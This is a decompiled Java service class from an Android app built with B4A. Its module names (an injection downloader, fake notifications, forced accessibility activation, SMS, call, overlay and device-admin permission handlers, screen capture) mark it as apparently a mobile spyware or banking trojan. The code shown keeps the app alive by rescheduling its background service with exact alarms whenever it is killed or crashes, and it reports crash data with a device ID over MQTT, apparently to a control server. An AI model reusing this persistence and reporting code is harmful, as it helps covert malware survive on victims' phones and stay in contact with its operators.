package com.com.androidrr;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import anywheresoftware.b4a.AbsObjectWrapper;
import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.BALayout;
import anywheresoftware.b4a.keywords.B4AApplication;
import anywheresoftware.b4a.keywords.Bit;
import anywheresoftware.b4a.keywords.Common;
import anywheresoftware.b4a.keywords.DateTime;
import anywheresoftware.b4a.objects.B4AException;
import anywheresoftware.b4a.objects.IntentWrapper;
import anywheresoftware.b4a.objects.RuntimePermissions;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.objects.collections.Map;
import anywheresoftware.b4a.phone.Phone;
import anywheresoftware.b4a.randomaccessfile.B4XSerializator;
import anywheresoftware.b4j.object.JavaObject;
import b4a.example.dateutils;
import java.lang.reflect.Method;
import org.eclipse.paho.client.mqttv3.internal.ClientDefaults;

/* loaded from: classes.dex */
public class starter extends Service {
    public static int _alm_rtc;
    public static int _alm_rtc_wakeup;
    public static int _flag_activity_clear_task;
    public static int _flag_activity_clear_top;
    public static int _flag_activity_new_task;
    public static int _flag_one_shot;
    public static Phone.PhoneWakeState _p11;
    public static fileprovider _provider;
    public static RuntimePermissions _rp;
    static starter mostCurrent;
    public static BA processBA;
    private ServiceHelper _service;
    public Common __c = null;
    public dateutils _dateutils = null;
    public main _main = null;
    public clsclassperms_code _clsclassperms_code = null;
    public clsclassperms_code2 _clsclassperms_code2 = null;
    public backgroundservice _backgroundservice = null;
    public mediaprojectionbackservice _mediaprojectionbackservice = null;
    public globalparameters _globalparameters = null;
    public dtrsbnotisuntilactv _dtrsbnotisuntilactv = null;
    public faknotiactivity _faknotiactivity = null;
    public forc_activateacc _forc_activateacc = null;
    public inj_dnlader _inj_dnlader = null;
    public mainglobalstrings _mainglobalstrings = null;
    public myreceiver _myreceiver = null;
    public notificationservice _notificationservice = null;
    public perm_activatemediaproject _perm_activatemediaproject = null;
    public perm_activateoverlay _perm_activateoverlay = null;
    public perm_ignorebatperm _perm_ignorebatperm = null;
    public perm_notiacc _perm_notiacc = null;
    public perm_phonecal _perm_phonecal = null;
    public perm_smsperm _perm_smsperm = null;
    public perm_startactdevmang _perm_startactdevmang = null;
    public perm_startactwritesy _perm_startactwritesy = null;
    public perm_unknownapps _perm_unknownapps = null;
    public perm_writesys _perm_writesys = null;
    public req_all_perms _req_all_perms = null;
    public s1 _s1 = null;
    public service1 _service1 = null;
    public service2 _service2 = null;
    public service3 _service3 = null;
    public service4 _service4 = null;
    public srvnewphonecall _srvnewphonecall = null;
    public wakeupdv _wakeupdv = null;
    public httputils2service _httputils2service = null;

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static class starter_BR extends BroadcastReceiver {
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            BA.LogInfo("** Receiver (starter) OnReceive **");
            Intent intent2 = new Intent(context, (Class<?>) starter.class);
            if (intent != null) {
                intent2.putExtra("b4a_internal_intent", intent);
            }
            ServiceHelper.StarterHelper.startServiceFromReceiver(context, intent2, true, BA.class);
        }
    }

    public static Class<?> getObject() {
        return starter.class;
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
            BA ba = new BA(this, (BALayout) null, (BA) null, "com.com.androidrr", "com.com.androidrr.starter");
            processBA = ba;
            if (BA.isShellModeRuntimeCheck(ba)) {
                processBA.raiseEvent2(null, true, "SHELL", false, new Object[0]);
            }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals", new Class[0]).invoke(null, null);
                processBA.loadHtSubs(getClass());
                ServiceHelper.init();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
        this._service = new ServiceHelper(this);
        processBA.service = this;
        if (BA.isShellModeRuntimeCheck(processBA)) {
            BA ba2 = processBA;
            ba2.raiseEvent2(null, true, "CREATE", true, "com.com.androidrr.starter", ba2, this._service, Float.valueOf(Common.Density));
        }
        processBA.setActivityPaused(false);
        BA.LogInfo("*** Service (starter) Create ***");
        processBA.raiseEvent(null, "service_create", new Object[0]);
        processBA.runHook("oncreate", this, null);
        if (ServiceHelper.StarterHelper.runWaitForLayouts()) {
            return;
        }
        BA.LogInfo("stopping spontaneous created service");
        stopSelf();
    }

    @Override // android.app.Service
    public void onStart(Intent intent, int i) {
        onStartCommand(intent, 0, 0);
    }

    @Override // android.app.Service
    public int onStartCommand(final Intent intent, int i, int i2) {
        if (!ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() { // from class: com.com.androidrr.starter.1
            @Override // java.lang.Runnable
            public void run() {
                starter.this.handleStart(intent);
            }
        })) {
            ServiceHelper.StarterHelper.addWaitForLayout(new Runnable() { // from class: com.com.androidrr.starter.2
                @Override // java.lang.Runnable
                public void run() {
                    starter.processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (starter) Create **");
                    starter.processBA.raiseEvent(null, "service_create", new Object[0]);
                    starter.this.handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
                }
            });
        }
        processBA.runHook("onstartcommand", this, new Object[]{intent, Integer.valueOf(i), Integer.valueOf(i2)});
        return 2;
    }

    @Override // android.app.Service
    public void onTaskRemoved(Intent intent) {
        super.onTaskRemoved(intent);
        processBA.raiseEvent(null, "service_taskremoved", new Object[0]);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void handleStart(Intent intent) {
        BA.LogInfo("** Service (starter) Start **");
        Method method = processBA.htSubs.get("service_start");
        if (method != null) {
            if (method.getParameterTypes().length > 0) {
                processBA.raiseEvent(null, "service_start", ServiceHelper.StarterHelper.handleStartIntent(intent, this._service, processBA));
            } else {
                processBA.raiseEvent(null, "service_start", new Object[0]);
            }
        }
    }

    @Override // android.app.Service
    public void onTimeout(int i) {
        BA.LogInfo("** Service (starter) Timeout **");
        Map map = new Map();
        map.Initialize();
        map.Put("StartId", Integer.valueOf(i));
        processBA.raiseEvent(null, "service_timeout", map);
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        BA.LogInfo("** Service (starter) Destroy (ignored)**");
    }

    public static boolean _application_error(B4AException b4AException, String str) throws Exception {
        Common.LogImpl("61703937", "Application Error : " + BA.ObjectToString(b4AException), 0);
        Common.LogImpl("61703938", "Application StackTrace : " + str, 0);
        BA ba = processBA;
        backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
        if (Common.IsPaused(ba, backgroundservice.getObject())) {
            DateTime dateTime = Common.DateTime;
            _setexactandallowwhileidle(DateTime.getNow() + 10, "BackgroundService");
            Common.LogImpl("61703944", "start when idle", 0);
        } else {
            backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
            if (backgroundservice._mqtt.IsInitialized()) {
                backgroundservice backgroundserviceVar3 = mostCurrent._backgroundservice;
                if (backgroundservice._mqtt.getConnected()) {
                    B4XSerializator b4XSerializator = new B4XSerializator();
                    Map map = new Map();
                    map.Initialize();
                    map.Put("data", b4AException.getObject());
                    map.Put("StackTrace", str);
                    globalparameters globalparametersVar = mostCurrent._globalparameters;
                    map.Put("DeviceID", globalparameters._mydeviceid);
                    backgroundservice backgroundserviceVar4 = mostCurrent._backgroundservice;
                    backgroundservice._mqtt.Publish2("postmyerror", b4XSerializator.ConvertObjectToBytes(map.getObject()), 1, false);
                }
            }
        }
        return true;
    }

    public static String _process_globals() throws Exception {
        _provider = new fileprovider();
        _rp = new RuntimePermissions();
        _flag_activity_clear_top = 67108864;
        _flag_activity_clear_task = 32768;
        _flag_activity_new_task = ClientDefaults.MAX_MSG_SIZE;
        _flag_one_shot = 1073741824;
        _alm_rtc = 1;
        _alm_rtc_wakeup = 0;
        _p11 = new Phone.PhoneWakeState();
        return "";
    }

    public static String _schedulerestartcrashedactivity(long j, String str, String str2) throws Exception {
        IntentWrapper intentWrapper = new IntentWrapper();
        intentWrapper.Initialize("", "");
        StringBuilder sb = new StringBuilder();
        B4AApplication b4AApplication = Common.Application;
        sb.append(B4AApplication.getPackageName());
        sb.append("/.");
        sb.append(str.toLowerCase());
        intentWrapper.SetComponent(sb.toString());
        intentWrapper.PutExtra("Crash", str2);
        Bit bit = Common.Bit;
        int i = _flag_activity_clear_task;
        Bit bit2 = Common.Bit;
        intentWrapper.setFlags(Bit.m182Or(i, Bit.m182Or(_flag_activity_clear_top, _flag_activity_new_task)));
        new JavaObject();
        ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), intentWrapper.getObject())).RunMethod("setAction", new Object[]{Common.Null});
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeContext(processBA);
        new JavaObject();
        JavaObject javaObject2 = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), javaObject.RunMethod("getSystemService", new Object[]{NotificationCompat.CATEGORY_ALARM}));
        JavaObject javaObject3 = (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), new JavaObject().InitializeStatic("android.app.PendingIntent").RunMethod("getActivity", new Object[]{javaObject.getObject(), 0, intentWrapper.getObject(), Integer.valueOf(_flag_one_shot)}));
        new Phone();
        if (Phone.getSdkVersion() < 20) {
            javaObject2.RunMethod("set", new Object[]{Integer.valueOf(_alm_rtc), Long.valueOf(j), javaObject3.getObject()});
        } else if (Phone.getSdkVersion() < 23) {
            javaObject2.RunMethod("setExact", new Object[]{Integer.valueOf(_alm_rtc), Long.valueOf(j), javaObject3.getObject()});
        } else {
            javaObject2.RunMethod("setExactAndAllowWhileIdle", new Object[]{Integer.valueOf(_alm_rtc), Long.valueOf(j), javaObject3.getObject()});
        }
        return "";
    }

    public static String _service_create() throws Exception {
        _provider._initialize(processBA);
        return "";
    }

    public static String _service_destroy() throws Exception {
        Common.LogImpl("61769473", "Starter Service_Destroy", 0);
        BA ba = processBA;
        backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
        if (!Common.IsPaused(ba, backgroundservice.getObject())) {
            return "";
        }
        DateTime dateTime = Common.DateTime;
        _setexactandallowwhileidle(DateTime.getNow() + 10, "BackgroundService");
        Common.LogImpl("61769476", "start when idle", 0);
        return "";
    }

    public static String _service_start(IntentWrapper intentWrapper) throws Exception {
        mostCurrent._service.StopAutomaticForeground();
        return "";
    }

    public static String _service_taskremoved() throws Exception {
        Common.LogImpl("61638402", "Starter Service_TaskRemoved", 0);
        BA ba = processBA;
        backgroundservice backgroundserviceVar = mostCurrent._backgroundservice;
        if (!Common.IsPaused(ba, backgroundservice.getObject())) {
            return "";
        }
        BA ba2 = processBA;
        backgroundservice backgroundserviceVar2 = mostCurrent._backgroundservice;
        Common.StartService(ba2, backgroundservice.getObject());
        Common.LogImpl("61638406", "start when idle", 0);
        return "";
    }

    public static String _setexactandallowwhileidle(long j, String str) throws Exception {
        new Phone();
        if (Phone.getSdkVersion() < 23) {
            Common.StartServiceAtExact(processBA, str, j, true);
        } else {
            IntentWrapper intentWrapper = new IntentWrapper();
            intentWrapper.Initialize("", "");
            StringBuilder sb = new StringBuilder();
            B4AApplication b4AApplication = Common.Application;
            sb.append(B4AApplication.getPackageName());
            sb.append("/.");
            sb.append(str.toLowerCase());
            intentWrapper.SetComponent(sb.toString());
            new JavaObject();
            ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), intentWrapper.getObject())).RunMethod("setAction", new Object[]{Common.Null});
            JavaObject javaObject = new JavaObject();
            javaObject.InitializeContext(processBA);
            new JavaObject();
            ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), javaObject.RunMethod("getSystemService", new Object[]{NotificationCompat.CATEGORY_ALARM}))).RunMethod("setExactAndAllowWhileIdle", new Object[]{0, Long.valueOf(j), ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), new JavaObject().InitializeStatic("android.app.PendingIntent").RunMethod("getService", new Object[]{javaObject.getObject(), 1, intentWrapper.getObject(), 134217728}))).getObject()});
        }
        return "";
    }
}